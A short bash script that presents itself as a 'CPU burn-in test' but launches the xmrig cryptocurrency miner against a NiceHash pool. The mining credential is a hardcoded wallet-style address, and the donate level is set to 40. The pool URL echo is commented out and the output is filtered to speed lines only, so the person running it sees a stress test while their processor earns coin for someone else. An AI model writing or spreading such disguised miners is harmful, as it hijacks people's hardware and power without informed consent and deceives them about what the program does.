#!/bin/bash

#variables
username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.cputest$RANDOM"
url="cryptonightr.usa-new.nicehash.com:3375"

cat /proc/cpuinfo | grep "model name" | head -1
echo $username
#echo $url
echo Burn in progress...
echo "[H] to report H/s; [Ctrl] + [C] to abort..."

#Execute CPU burn-in test
#./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500
./xmrig --algo="cn/r" --url=$url --user=$username --pass="x" --asm=auto --nicehash --donate-level=40 --print-time=500 | grep speed
